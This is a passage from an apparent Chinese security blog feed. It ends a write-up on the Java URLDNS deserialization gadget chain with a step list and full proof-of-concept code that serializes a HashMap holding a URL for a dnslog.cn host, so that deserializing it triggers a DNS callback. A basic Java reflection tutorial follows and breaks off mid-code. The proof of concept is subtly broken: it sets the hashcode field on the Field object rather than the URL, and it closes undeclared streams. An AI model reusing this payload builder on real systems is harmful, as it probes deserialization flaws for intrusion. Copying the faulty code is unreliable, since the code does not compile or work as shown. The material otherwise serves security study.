title="hashcode()方法"></p><p>流对象的<code>hashcode()</code>调用了<code>getHostAddress()</code>方法</p><p><img src="/posts/643c7e53/url-27.png" title="hashcode()方法"></p><p>跟进<code>getHostAddress()</code>方法，返回URL类的<code>u.getHostAddress()</code>方法</p><p><img src="/posts/643c7e53/url-28.png" title="getHostAddress()"></p><p>跟进<code>u.getHostAddress()</code>方法，调用<code>getByName()</code>从而解析请求dnslog，导致漏洞触发。</p><p><img src="/posts/643c7e53/url-44.png" title="dnslog请求"><br><img src="/posts/643c7e53/url-29.png" title="dnslog请求"></p><p>到此URLDNS链的反序列化触发访问dnslog就完成。</p><h2 id="总结URLDNS反序列化链流程"><a href="#总结URLDNS反序列化链流程" class="headerlink" title="总结URLDNS反序列化链流程"></a>总结URLDNS反序列化链流程</h2><ol><li><code>ObjectInputStream</code>读取<code>HashMap</code>的序列化文件</li><li>通过正常<code>Object</code>流<code>readObject</code>反序列化文件获取二进制数据</li><li>对二进制序列化数据进行读取并建立实例对象</li><li>通过对实例对象判断是否存在重写方法</li><li>获取到<code>HashMap</code>对象重写反序列化<code>readObject</code>方法，跳转执行该对象的<code>readObject</code>方法。</li><li>遍历序列化<code>Key</code>和<code>value</code>值，进行<code>hash</code>运算</li><li><code>hash</code>方法中<code>key</code>不为空时，调用<code>URL</code>类的<code>hashcode</code>方法</li><li>当<code>hashcode</code>等于-1时，调用<code>URLStreamHandler</code>流的<code>hashcode</code>方法</li><li><code>hashcode</code>方法中调用了<code>getHostAddress()</code>方法</li><li><code>getHostAddress()</code>方法返回<code>URL</code>类的<code>u.getHostAddress()</code>,</li><li><code>URL</code>类的<code>getHostAddress()</code>方法调用<code>getByName()</code>方法从而解析请求dns</li></ol><p><strong>其中步骤1-5为正常反序列化的读取步骤，6-11为获取HashMap对象执行重写readObject方法步骤。</strong></p><h1 id="0x04、POC编写"><a href="#0x04、POC编写" class="headerlink" title="0x04、POC编写"></a>0x04、POC编写</h1><p>通过上述过程可以理出来代码重要步骤。<br>主要生成HashMap对象和URL对象</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">HashMap hm=<span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">URL u=<span class="keyword">new</span> <span class="title class_">URL</span>(<span class="string">&quot;http://yuk9sy.dnslog.cn&quot;</span>);</span><br></pre></td></tr></table></figure><p>并通过反射控制URL类中hashcode的值</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Field</span> <span class="variable">code</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.net.URL&quot;</span>).getDeclaredField(<span class="string">&quot;hashcode&quot;</span>);  <span class="comment">//通过反射去控制hashcode值</span></span><br><span class="line">       code.setAccessible(<span class="literal">true</span>); <span class="comment">//突破封装访问私有变量</span></span><br></pre></td></tr></table></figure><p>放入hashMap put值</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">hm.put(u,<span class="number">123</span>);  <span class="comment">//设置HashMap键值对</span></span><br></pre></td></tr></table></figure><p>通过设置hashcode为-1去触发dns请求</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">code.set(code,-<span class="number">1</span>);  <span class="comment">//通过设置hashcode为-1去触发dns请求</span></span><br></pre></td></tr></table></figure><p>然后就是序列化HashMap对象，最后反序列化。<br>完整POC：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> ysoserial;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Poc</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(<span class="keyword">final</span> String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        HashMap hm=<span class="keyword">new</span> <span class="title class_">HashMap</span>(); <span class="comment">//创建HashMap对象</span></span><br><span class="line">        URL u=<span class="keyword">new</span> <span class="title class_">URL</span>(<span class="string">&quot;http://yuk9sy.dnslog.cn&quot;</span>); <span class="comment">//创建URL对象</span></span><br><span class="line">        <span class="type">Field</span> <span class="variable">code</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.net.URL&quot;</span>).getDeclaredField(<span class="string">&quot;hashcode&quot;</span>);  <span class="comment">//通过反射去控制hashcode值</span></span><br><span class="line">        code.setAccessible(<span class="literal">true</span>); <span class="comment">//突破封装访问私有变量</span></span><br><span class="line">        code.set(code,<span class="number">1</span>); <span class="comment">//将hashcode设置不为-1，避免在序列化生成过程触发dns</span></span><br><span class="line">        hm.put(u,<span class="number">123</span>);  <span class="comment">//设置HashMap键值对</span></span><br><span class="line">        code.set(code,-<span class="number">1</span>); <span class="comment">//将hashcode值设置为-1 , 确保在反序列化的时候触发dns</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            <span class="comment">//序列化过程</span></span><br><span class="line">            <span class="type">ObjectOutputStream</span> <span class="variable">outputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;./payload.ser&quot;</span>));</span><br><span class="line">            outputStream.writeObject(hm);</span><br><span class="line">            outputStream.close();</span><br><span class="line">            fileOutputStream.close();</span><br><span class="line"></span><br><span class="line">            <span class="comment">//反序列化过程</span></span><br><span class="line">            <span class="type">ObjectInputStream</span> <span class="variable">inputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;./payload.ser&quot;</span>));</span><br><span class="line">            inputStream.readObject();</span><br><span class="line">            inputStream.close();</span><br><span class="line">            fileInputStream.close();</span><br><span class="line">        &#125;<span class="keyword">catch</span>(Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="0x05、参考链接"><a href="#0x05、参考链接" class="headerlink" title="0x05、参考链接"></a>0x05、参考链接</h1><p><a href="https://mp.weixin.qq.com/s/MiBpBHRUkJbEwTcERgEx5w">https://mp.weixin.qq.com/s/MiBpBHRUkJbEwTcERgEx5w</a><br><a href="https://paper.seebug.org/1242/#commons-collections">https://paper.seebug.org/1242/#commons-collections</a></p>]]></content>
      
      
      <categories>
          
          <category> Java安全 </category>
          
          <category> java利用链 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java安全 </tag>
            
            <tag> java利用链 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>java安全-初识java反射</title>
      <link href="/posts/7a787d86.html"/>
      <url>/posts/7a787d86.html</url>
      
        <content type="html"><![CDATA[<h1 id="0x00、前言"><a href="#0x00、前言" class="headerlink" title="0x00、前言"></a>0x00、前言</h1><p>学习java基础知识记录，方便查阅。</p><h1 id="0x01、反射基础"><a href="#0x01、反射基础" class="headerlink" title="0x01、反射基础"></a>0x01、反射基础</h1><h2 id="一、反射概念"><a href="#一、反射概念" class="headerlink" title="一、反射概念"></a>一、反射概念</h2><blockquote><p>java执行分为<font color="red">编译期</font>和<font color="red">运行期</font><br><font color="red">编译期</font>是指把源码交给编译器编译成计算机可以执行的文件的过程。在 Java 中也就是把 Java 代码编成 class 文件的过程。编译期只是做了一些翻译功能，并没有把代码放在内存中运行起来，而只是把代码当成文本进行操作，比如检查错误。</p><p><font color="red">运行期</font>是把编译后的文件交给计算机执行，直到程序运行结束。所谓运行期就把在磁盘中的代码放到内存中执行起来。</p></blockquote><p>Java 反射机制是在<font color="red">运行状态</font>中，对于任意一个类，都能够知道这个类的所有属性和方法；对于任意一个对象，都能够调用它的任意方法和属性；这种动态获取信息以及动态调用对象方法的功能称为 Java 语言的反射机制。简单来说，反射机制指的是程序在运行时能够获取自身的信息。在 Java 中，只要给定类的名字，就可以通过反射机制来获得类的所有信息。</p><p><strong>Java 反射机制主要提供了以下功能，这些功能都位于<code>java.lang.reflect</code>包。</strong></p><ul><li>在运行时判断任意一个对象所属的类。</li><li>在运行时构造任意一个类的对象。</li><li>在运行时判断任意一个类所具有的成员变量和方法。</li><li>在运行时调用任意一个对象的方法。</li><li>生成动态代理。</li></ul><p><strong>反射与常用引用类对象区别</strong><br>正常方式：引入对应的包类名称——&gt;通过new实例化——&gt;获取实例化对象</p><p><img src="/posts/7a787d86/jc-1.png" title="正常实现"></p><p>反射方式：实例化类对象——&gt;Class获取方法——&gt;得到完整的包类名称</p><p><img src="/posts/7a787d86/jc-4.png" title="反射实现"></p><p><strong>Java反射机制的优缺点</strong><br>优点：</p><ul><li>能够运行时<font color="red">动态获取类的实例</font>，大大提高系统的<font color="red">灵活性</font>和<font color="red">扩展性</font>。</li><li>与Java动态编译相结合，可以实现无比强大的功能。</li><li>降低代码程序之间的依赖性。</li><li>对于Java这种先编译再运行的语言，能够让我们很方便的创建灵活的代码，这些代码可以在运行时装配，无需在组件之间进行源代码的链接，更加容易实现面向对象。</li></ul><p>缺点：</p><ul><li>反射会<font color="red">消耗一定的系统资源</font>，因此，如果不需要动态地创建一个对象，那么就不需要用反射；</li><li>冗余了很多代码量。</li><li>反射调用方法时可以忽略权限检查，获取这个类的私有方法和属性，因此可能会破坏类的封装性而导致安全问题。</li></ul><h2 id="二、反射实现"><a href="#二、反射实现" class="headerlink" title="二、反射实现"></a>二、反射实现</h2><h3 id="1、总结简述"><a href="#1、总结简述" class="headerlink" title="1、总结简述"></a>1、总结简述</h3><font color="red"><p><strong>1、通过Class类获取类。</strong><br><strong>2、通过newInstance()对类进行实例化。</strong><br><strong>3、通过Field访问成员变量|通过Method访问成员方法|通过Constructor访问成员构造方法</strong></p></font><p>注：如果实例类存在构造方法，newInstance()实例化必须保证实例类存在无参构造方法，如只有有参构造方法，newInstance()会报错。Java9以后推荐用clazz.getDeclaredConstructor().newInstance()方式即获取构造方法后再实例化，而非直接newInstance()。</p><p><strong>反射机制重要的类</strong></p><table><thead><tr><th align="center">类</th><th align="left">含义</th></tr></thead><tbody><tr><td align="center">java.lang.Class</td><td align="left">代表整个字节码。代表一个类型，代表整个类。</td></tr><tr><td align="center">java.lang.reflect.Method</td><td align="left">代表字节码中的方法字节码。代表类中的方法。</td></tr><tr><td align="center">java.lang.reflect.Constructor</td><td align="left">代表字节码中的构造方法字节码。代表类中的构造方法（方法名同类名相同且无参的方法）。</td></tr><tr><td align="center">java.lang.reflect.Field</td><td align="left">代表字节码中的属性字节码。代表类中的成员变量（静态变量+实例变量）。</td></tr></tbody></table><p><font color="red">必须通过Class获取类过后才能获取Method、Constructor、Field</font><br>也就是说Class是反射实现的前提。且Class并不是new出来的，而是java内置的。</p><h3 id="2、Class访问类"><a href="#2、Class访问类" class="headerlink" title="2、Class访问类"></a>2、Class访问类</h3><p><strong>Class获取方式</strong></p><table><thead><tr><th align="center">方式</th><th align="center">示例注解</th></tr></thead><tbody><tr><td align="center">Class.forName(“完整类名带包名”)</td><td align="center">Class A&#x3D;Class.forName(“com.java.reflect.people”);</td></tr><tr><td align="center">对象.getClass()</td><td align="center">people peo&#x3D;new people();Class A&#x3D;peo.getClass();</td></tr><tr><td align="center">任何类型.class</td><td align="center">Class A &#x3D; String.class;</td></tr></tbody></table><p><strong>反射类可访问的常用方法</strong></p><p><img src="/posts/7a787d86/jc-2.png" title="常用方法"></p><p><strong>代码实现</strong><br>people类：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.javaweb.reflect;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">people</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> String phone;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> age;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>实现类：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.javaweb.reflect;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">reflect</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span> <span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="comment">//1、使用反射.forName(&quot;完整类名&quot;)获取类</span></span><br><span class="line">        Class people1=Class.forName(<span class="string">&quot;com.javaweb.reflect.people&quot;</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;使用.forName(\&quot;完整类名\&quot;)获取类 的类名&quot;</span>+people1.getName());</span><br><span class="line">        <span class="comment">//2、使用反射 对象.getClass()获取类</span></span><br><span class="line">        people pl=<span class="keyword">new</span> <span class="title class_">people</span>();</span><br><span class="line">        Class people2=pl.getClass();</span><br><span class="line">        System.out.println(<span class="string">&quot;使用对象.getClass()获取类 的类名&quot;</span>+people2.getName());</span><br><span class="line">        <span class="comment">//3、使用反射 任何类型.class获取类</span></span><br><span class="line">        Class people3=String.class;</span><br><span class="line">        System.out.println(<span class="string">&quot;使用任何类型.class获取类 的类名&quot;</span>+people3.getName());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>三种获取类的实现截图：</p><p><img src="/posts/7a787d86/jc-4.png" title="Class类获取"></p><h3 id="2、Field访问成员变量"><a href="#2、Field访问成员变量" class="headerlink" title="2、Field访问成员变量"></a>2、Field访问成员变量</h3><p>通过下列任意一个方法访问成员变量时将返回 Field 类型的对象或数组。<br><strong>Field声明使用的方法</strong></p><table><thead><tr><th align="center">Field声明时的方法</th><th align="center">注解</th></tr></thead><tbody><tr><td align="center">getFields()</td><td align="center">获取所有权限为public的成员变量</td></tr><tr><td align="center">getField(String name)</td><td align="center">获取变量名为name的成员变量</td></tr><tr><td align="center">getDeclaredFields()</td><td align="center">获取当前对象的所有成员变量</td></tr><tr><td align="center">getDeclaredField(String name)</td><td align="center">获取变量名为name的成员变量</td></tr></tbody></table><p>注：针对private私有的变量，需要使用<code>setAccessible(true)</code>方法打破封装，访问私有变量</p><p><strong>Field常用方法</strong></p><table><thead><tr><th align="center">方法名称</th><th align="left">说明</th></tr></thead><tbody><tr><td align="center">getName()</td><td align="left">获得该成员变量的名称</td></tr><tr><td align="center">getType()</td><td align="left">获取表示该成员变量的 Class 对象</td></tr><tr><td align="center">get(Object obj)</td><td align="left">获得指定对象 obj 中成员变量的值，返回值为 Object 类型</td></tr><tr><td align="center">set(Object obj, Object value)</td><td align="left">将指定对象 obj 中成员变量的值设置为 value</td></tr><tr><td align="center">getlnt(0bject obj)</td><td align="left">获得指定对象 obj 中成员类型为 int 的成员变量的值</td></tr><tr><td align="center">setlnt(0bject obj, int i)</td><td align="left">将指定对象 obj 中成员变量的值设置为 i</td></tr><tr><td align="center">setFloat(Object obj, float f)</td><td align="left">将指定对象 obj 中成员变量的值设置为 f</td></tr><tr><td align="center">getBoolean(Object obj)</td><td align="left">获得指定对象 obj 中成员类型为 boolean 的成员变量的值</td></tr><tr><td align="center">setBoolean(Object obj, boolean b)</td><td align="left">将指定对象 obj 中成员变量的值设置为 b</td></tr><tr><td align="center">getFloat(Object obj)</td><td align="left">获得指定对象 obj 中成员类型为 float 的成员变量的值</td></tr><tr><td align="center">setAccessible(boolean flag)</td><td align="left">此方法可以设置是否忽略权限直接访问 private 等私有权限的成员变量</td></tr><tr><td align="center">getModifiers()</td><td align="left">获得可以解析出该方法所采用修饰符的整数</td></tr></tbody></table><p><strong>代码实现</strong><br>people类：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.javaweb.reflect;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">people</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> String phone;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> age;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>实现类：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.javaweb.reflect;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">reflect</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span> <span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="comment">//三种获取类的方式</span></span><br><span class="line">        <span class="comment">//1、使用反射.forName(&quot;完整类名&quot;)获取类</span></span><br><span class="line">        Class people1=Class.forName(<span class="string">&quot;com.javaweb.reflect.people&quot;</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;使用.forName(\&quot;完整类名\&quot;)获取类 的类名&quot;</span>+people1.getName());</span><br><span class="line">        <span class="comment">//2、使用反射 对象.getClass()获取类</span></span><br><span class="line">        people pl=<span class="keyword">new</span> <span class="title class_">people</span>();</span><br><span class="line">        Class people2=pl.getClass();</span><br><span class="line">        System.out.println(<span class="string">&quot;使用对象.getClass()获取类 的类名&quot;</span>+people2.getName());</span><br><span class="line">        <span class="comment">//3、使用反射 任何类型.class获取类</span></span><br><span class="line">        Class people3=String.class;</span><br><span class="line">        System.out.println(<span class="string">&quot;使用任何类型.class获取类 的类名&quot;</span>+people3.getName());</span><br><span class="line"></span><br><span class="line">        <span class="comment">//进行反射类实例化</span></span><br><span class="line">        Object obj=people1.newInstance();</span><br><span class="line">        <span class="comment">//System.out.println(obj);</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//Field访问成员变量</span></span><br><span class="line">        <span class="comment">//反射获取类变量</span></span><br><span class="line">        Field A=people1.getDeclaredField(<span class="string">&quot;name&quot;</span>);</span><br><span class="line">        <span class="comment">//由于people类属性值为private私有的，需要setAccessible(true)打破封装，访问私有变量。</span></span><br><span class="line">        A.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="comment">//反射设置类中的变量值</span></span><br><span class="line">        A.set(obj,<span class="string">&quot;张三&quot;</span>);</span><br><span class="line">        <span class="comment">//输出该obj对象中变量的变量值</span></span><br><span class="line">        System.out.println(A.get(obj));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Field实现截图：</p><p><img src="/posts/7a787d86/jc-5.png" title="Field实现"></p><h3 id="3、Method访问成员方法"><a href="#3、Method访问成员方法" class="headerlink" title="3、Method访问成员方法"></a>3、Method访问成员方法</h3><p>要动态获取一个对象方法的信息，首先需要通过下列方法之一创建一个<code>Method</code>类型的对象或者数组。<br><strong>Method声明使用的方法</strong></p><table><thead><tr><th align="center">Method声明使用的方法</th><th align="left">注解</th></tr></thead><tbody><tr><td align="center">getMethods()</td><td align="left">获取所有权限为public的成员方法</td></tr><tr><td align="center">getMethods(String name,Class&lt;?&gt; …parameterTypes)</td><td align="left">获取方法名为name的成员方法，参数类型在方法名逗号后面,没有形参就不传</td></tr><tr><td align="center">getDeclaredMethods()</td><td align="left">获取的成员所有的方法</td></tr><tr><td align="center">getDeclaredMethods(String name,Class&lt;?&gt;…parameterTypes)</td><td align="left">获取方法名为name的成员方法，参数类型在方法名逗号后面,没有形参就不传</td></tr></tbody></table><p>注：针对private私有的方法，需要使用<code>setAccessible(true)</code>方法打破封装，访问私有方法</p><p><strong>Method常用方法</strong></p><table><thead><tr><th align="center">静态方法名称</th><th align="left">说明</th></tr></thead><tbody><tr><td align="center">getName()</td><td align="left">获取该方法的名称</td></tr><tr><td align="center">getParameterType()</td><td align="left">按照声明顺序以 Class 数组的形式返回该方法各个参数的类型</td></tr><tr><td align="center">getReturnType()</td><td align="left">以 Class 对象的形式获得该方法的返回值类型</td></tr><tr><td align="center">getExceptionTypes()</td><td align="left">以 Class 数组的形式获得该方法可能抛出的异常类型</td></tr><tr><td align="center">invoke(Object obj,Object…args)</td><td align="left">利用 args 参数执行指定对象 obj 中的该方法，返回值为 Object 类型</td></tr><tr><td align="center">isVarArgs()</td><td align="left">查看该方法是否允许带有可变数量的参数，如果允许返回 true，否则返回 false</td></tr><tr><td align="center">getModifiers()</td><td align="left">获得可以解析出该方法所采用修饰符的整数</td></tr></tbody></table><p><strong>代码实现</strong><br>people类：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.javaweb.reflect;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">people</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> String phone;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> age;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setinfo</span><span class="params">(String name,String phone,<span class="type">int</span> age)</span>&#123;</span><br><span class="line">        <span class="built_in">this</span>.name=name;</span><br><span class="line">        <span class="built_in">this</span>.phone=phone;</span><br><span class="line">        <span class="built_in">this</span>.age=age;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">show</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;&#123;name:&quot;</span>+name+<span class="string">&quot;;age:&quot;</span>+age+<span class="string">&quot;;phone:&quot;</span>+phone+<span class="string">&quot;&#125;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>实现类：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.javaweb.reflect;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">reflect</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span> <span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="comment">//三种获取类的方式</span></span><br><span class="line">        <span class="comment">//1、使用反射.forName(&quot;完整类名&quot;)获取类</span></span><br><span class="line">        Class people1=Class.forName(<span class="string">&quot;com.javaweb.reflect.people&quot;</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;使用.forName(\&quot;完整类名\&quot;)获取类 的类名&quot;</span>+people1.getName());</span><br><span class="line">        <span class="comment">//2、使用反射 对象.getClass()获取类</span></span><br><span class="line">        people pl=<span class="keyword">new</span> <span class="title class_">people</span>();</span><br><span class="line">        Class people2=pl.getClass();</span><br><span class="line">        System.out.println(<span class="string">&quot;使用对象.getClass()获取类 的类名&quot;</span>+people2.getName());</span><br><span class="line">        <span class="comment">//3、使用反射 任何类型.class获取类</span></span><br><span class="line">        Class people3=String.class;</span><br><span class="line">        System.out.println(<span class="string">&quot;使用任何类型.class获取类 的类名&quot;</span>+people3.getName());</span><br><span class="line"></span><br><span class="line">        <span class="comment">//进行反射类实例化</span></span><br><span class="line">        Object obj=people1.newInstance();</span><br><span class="line">        <span class="comment">//System.out.println(obj);</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//Field访问成员变量</span></span><br><span class="line">        <span class="comment">//反射获取类变量</span></span><br><span class="line">        Field A=people1.getDeclaredField(<span class="string">&quot;name&quot;</span>);</span><br><span class="line">        <span class="comment">//由于people类属性值为private私有的，需要setAccessible(true)打破封装，访问私有变量。</span></span><br><span class="line">        A.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="comment">//反射设置类中的变量值</span></span><br><span class="line">        A.set(obj,<span class="string">&quot;张三&quot;</span>);</span><br><span class="line">        <span class="comment">//输出该obj对象中变量的变量值</span></span><br><span class="line">        System.out.println(A.get(obj));</span><br><span class="line"></span><br><span class="line">        <span class="comment">//Method访问成员setinfo()方法并传参设置变量值</span></span><br><span class="line">        Method mt=people1.getDeclaredMethod(<span class="string">&quot;setinfo&quot;</span>, String.class, String.class, <span class="type">int</span>.class);</span><br><span class="line">        <span class="comment">//Method调用方法传参</span></span><br><span class="line">        Object mtobj=mt.invoke(obj,<span class="string">&quot;张三&quot;</span>,<span class="string">&quot;13011111111&quot;</span>,<span class="number">18</span>);</span><br><span class="line">        <span class="comment">//Method访问成员show()方法</span></span><br><span class="line">        Method mt2=people1.getDeclaredMethod(<span class="string">&quot;show&quot;</span>);</span><br><span class="line">        Object mtobj2=mt2.invoke(obj);</span><br><span class="line">        System.out.println(mtobj2);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Method实现截图：</p><p><img src="/posts/7a787d86/jc-6.png" title="Method实现"></p><h3 id="4、Constructor访问成员构造方法"><a href="#4、Constructor访问成员构造方法" class="headerlink" title="4、Constructor访问成员构造方法"></a>4、Constructor访问成员构造方法</h3><p>为了能够动态获取对象构造方法的信息，首先需要通过下列方法之一创建一个 Constructor 类型的对象或者数组。<br><strong>Constructor声明使用的方法</strong></p><table><thead><tr><th align="center">Constructor声明使用的方法</th><th align="center">注解</th></tr></thead><tbody><tr><td align="center">getConstructor(Class&lt;?&gt;…parameterTypes)</td><td align="center">获取所有权限为public的构造方法</td></tr><tr><td align="center">getDeclaredConstructors()</td><td align="center">获取当前对象的所有构造方法</td></tr><tr><td align="center">getDeclaredConstructor(Class&lt;?&gt;…parameterTypes)</td><td align="center">获取当前对象所有带参数类型的构造方法</td></tr></tbody></table><p><strong>Constructor常用的方法</strong></p><table><thead><tr><th align="center">方法名称</th><th align="left">说明</th></tr></thead><tbody><tr><td align="center">public String getName()</td><td align="left">返回构造方法名</td></tr><tr><td align="center">isVarArgs()</td><td align="left">查看该构造方法是否允许带可变数量的参数，如果允许，返回 true，否则返回false</td></tr><tr><td align="center">getParameterTypes()</td><td align="left">按照声明顺序以 Class 数组的形式获取该构造方法各个参数的类型</td></tr><tr><td align="center">getExceptionTypes()</td><td align="left">以 Class 数组的形式获取该构造方法可能抛出的异常类型</td></tr><tr><td align="center">newInstance(Object … initargs)</td><td align="left">通过该构造方法利用指定参数创建一个该类型的对象，如果未设置参数则表示采用默认无参的构造方法</td></tr><tr><td align="center">setAccessiable(boolean flag)</td><td align="left">如果该构造方法的权限为 private，默认为不允许通过反射利用 netlnstance()方法创建对象。如果先执行该方法，并将入口参数设置为 true，则允许创建对象</td></tr><tr><td align="center">getModifiers()</td><td align="left">获得可以解析出该构造方法所采用修饰符的整数</td></tr></tbody></table><p><strong>代码实现</strong><br>people类：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.javaweb.reflect;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">people</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> String phone;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> age;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setinfo</span><span class="params">(String name,String phone,<span class="type">int</span> age)</span>&#123;</span><br><span class="line">        <span class="built_in">this</span>.name=name;</span><br><span class="line">        <span class="built_in">this</span>.phone=phone;</span><br><span class="line">        <span class="built_in">this</span>.age=age;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">people</span><span class="params">()</span>&#123;</span><br><span class="line">        System.out.print(<span class="string">&quot;调用了无参构造方法：&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">people</span><span class="params">(String name,String phone,<span class="type">int</span> age)</span>&#123;</span><br><span class="line">        setinfo(name,phone,age);</span><br><span class="line">        System.out.print(<span class="string">&quot;调用了带参数的构造方法：&quot;</span>+show());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">show</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;&#123;name:&quot;</span>+name+<span class="string">&quot;;age:&quot;</span>+age+<span class="string">&quot;;phone:&quot;</span>+phone+<span class="string">&quot;&#125;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>实现类：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.javaweb.reflect;</span><br><span 